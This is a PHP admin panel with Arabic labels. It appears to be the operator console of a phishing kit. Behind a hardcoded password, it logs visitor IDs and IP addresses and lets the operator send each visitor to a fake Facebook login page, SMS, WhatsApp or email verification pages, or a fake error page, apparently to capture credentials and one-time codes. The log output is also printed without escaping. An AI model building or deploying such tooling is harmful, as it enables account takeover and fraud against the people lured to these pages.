<?php
// كلمة سر الأدمن (يمكنك تغييرها)
define('ADMIN_PASSWORD', 'admin123');

// التحقق من تسجيل الدخول
session_start();
if ($_POST['password'] === ADMIN_PASSWORD) {
    $_SESSION['admin_logged_in'] = true;
}

if (!isset($_SESSION['admin_logged_in'])) {
    ?>
    <!DOCTYPE html>
    <html dir="rtl">
    <head>
        <title>تسجيل دخول الأدمن</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
            input { padding: 10px; margin: 10px; width: 200px; }
            button { padding: 10px 20px; background: #4CAF50; color: white; border: none; cursor: pointer; }
        </style>
    </head>
    <body>
        <h2>تسجيل دخول الأدمن</h2>
        <form method="POST">
            <input type="password" name="password" placeholder="كلمة السر" required><br>
            <button type="submit">دخول</button>
        </form>
    </body>
    </html>
    <?php
    exit;
}

// معالجة إضافة توجيه جديد
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['visitor_id'])) {
    $redirect_data = [
        'visitor_id' => $_POST['visitor_id'],
        'redirect_to' => $_POST['redirect_to'],
        'time' => date('Y-m-d H:i:s')
    ];
    file_put_contents('redirects.log', json_encode($redirect_data)."\n", FILE_APPEND);
    $message = "تم حفظ التوجيه بنجاح!";
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>لوحة التحكم</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Tajawal', sans-serif;
        }
        body {
            background: #f5f5f5;
            padding: 20px;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            margin-bottom: 20px;
            text-align: center;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input, select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            padding: 10px;
            border: 1px solid #ddd;
            text-align: right;
        }
        th {
            background: #f2f2f2;
        }
        .message {
            padding: 10px;
            background: #dff0d8;
            color: #3c763d;
            margin-bottom: 15px;
            border-radius: 4px;
            display: <?php echo isset($message) ? 'block' : 'none'; ?>;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>لوحة تحكم الأدمن</h1>
        
        <div class="message"><?php echo $message ?? ''; ?></div>
        
        <form method="POST">
            <div class="form-group">
                <label for="visitor_id">معرف الزائر:</label>
                <input type="text" id="visitor_id" name="visitor_id" required>
            </div>
            
            <div class="form-group">
                <label for="redirect_to">التوجيه إلى:</label>
                <select id="redirect_to" name="redirect_to" required>
                    <option value="facebook_login.html">صفحة فيسبوك</option>
                    <option value="sms_verification.html">التحقق عبر SMS</option>
                    <option value="whatsapp_verification.html">التحقق عبر واتساب</option>
                    <option value="email_verification.html">التحقق عبر البريد</option>
                    <option value="technical_error.html">صفحة الخطأ التقني</option>
                </select>
            </div>
            
            <button type="submit">حفظ التوجيه</button>
        </form>
        
        <h2>سجل الزوار</h2>
        <table>
            <tr>
                <th>معرف الزائر</th>
                <th>عنوان IP</th>
                <th>الصفحة</th>
                <th>الوقت</th>
            </tr>
            <?php
            $visitors = file_exists('visitors.log') ? file('visitors.log', FILE_IGNORE_NEW_LINES) : [];
            foreach (array_reverse($visitors) as $entry) {
                $data = json_decode($entry, true);
                echo "<tr>
                    <td>{$data['visitor_id']}</td>
                    <td>{$data['ip']}</td>
                    <td>{$data['page']}</td>
                    <td>{$data['time']}</td>
                </tr>";
            }
            ?>
        </table>
        
        <h2>سجل التوجيهات</h2>
        <table>
            <tr>
                <th>معرف الزائر</th>
                <th>التوجيه إلى</th>
                <th>الوقت</th>
            </tr>
            <?php
            $redirects = file_exists('redirects.log') ? file('redirects.log', FILE_IGNORE_NEW_LINES) : [];
            foreach (array_reverse($redirects) as $entry) {
                $data = json_decode($entry, true);
                echo "<tr>
                    <td>{$data['visitor_id']}</td>
                    <td>{$data['redirect_to']}</td>
                    <td>{$data['time']}</td>
                </tr>";
            }
            ?>
        </table>
    </div>
</body>
</html>
